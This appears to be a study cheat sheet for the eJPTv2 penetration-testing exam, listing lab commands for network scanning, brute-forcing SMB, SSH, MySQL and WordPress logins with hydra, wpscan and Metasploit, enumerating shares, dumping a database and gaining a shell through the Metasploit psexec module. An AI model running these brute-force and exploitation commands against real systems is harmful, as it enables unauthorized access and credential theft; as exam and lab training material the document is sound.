This file contains the cheat sheet for those who wants to take the eJPTv2 exam. So you can just use this for your referencing.


# Discovering hosts available on a network
<hr>

## Get the IP address of your machine
```
$ ifconfig
192.168.56.2
```
## Scanning for hosts available on the subnet
```
$ netdiscover -r 192.168.56.0/24
```
or
```
$ nmap -sV 192.168.56.0/24 -v
```
## Performing portscanning and OS detection scanning
```
$ nmap -A 192.168.56.50 -p- -T4 -v

# This scan should be performed on all hosts gotten from netdiscover
```



# Enumeration
<hr>

## SMB Enumeration

#### To Bruteforce For SMB (Port 445)
```
$ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://192.168.56.50
```
or
```
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 192.168.56.50
run
```
#### To Bruteforce for SMB(Port 445) with Known Usernames, e.g admin
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.168.56.50
```
#### To enumerate users available on the SMB Server
```
$ enum4linux -U 192.168.56.50
```
#### To list the available shares available on the SMB Server 
```
$ smbclient -L 192.168.56.50
```
#### To connect to SMB shares
```
$ smbclient //192.168.56.50/shared
```
-------------------

## SSH Enumeration

#### To Bruteforce for SSH (Port 22)
```
$ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://192.168.56.50
```
#### To bruteforce for SSH(Port 22) with Known Usernames, e.g admin
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.50
```
--------------

## FTP Enumeration

#### To check if anonymous login is allowed for ftp
```
$ nmap 192.168.56.50 -p 21 --script ftp-anon
```
#### If anonymous login is allowed, we can connect using
```
$ ftp 192.168.56.50

username: anonymous
password: anonymous
```
--------------

## MySQL Enumeration

#### To Bruteforce for MySQL creds
```
$ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://192.168.56.50
```
#### To Bruteforce for MySQL creds with a Known Username, e.g root
```
$ hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.50
```
#### To connect to mysql database with credentials
```
$ mysql -h 192.168.56.50 -u root -p
```
#### To dump a database after connecting to the mysql server
```
show databases;
use (database)
show tables;
select * from (tables);
```
---------------------

## Directory Enumeration

#### To enumerate sub directories
```
$ dirb http://192.168.56.50
```
----------------

## Wordpress Enumeration

#### To bruteforce for plugins, themes and users 
```
$ wpscan --url http://example.com --enumerate p --enumerate t --enumerate u
```
#### To bruteforce password for a particular user
```
$ wpscan --url http://examole.com -U blackanon -P /usr/share/wordlists/rockyou.txt
```
#### To enumerate plugins
```
$ wpscan --url http://example.com --plugins-detection aggressive -t 60
```
-----------------------

# Exploitation
<hr>

## SMB Exploitation

#### If you have SMB Credentials for example username: blackanon  password: blackanon123. You can try psexec module on metasploit 
```
use exploit/windows/smb/psexec
set SMBUser blackanon
set SMBPass blackanon123
set RHOSTS 192.168.56.50
run
```
-----------















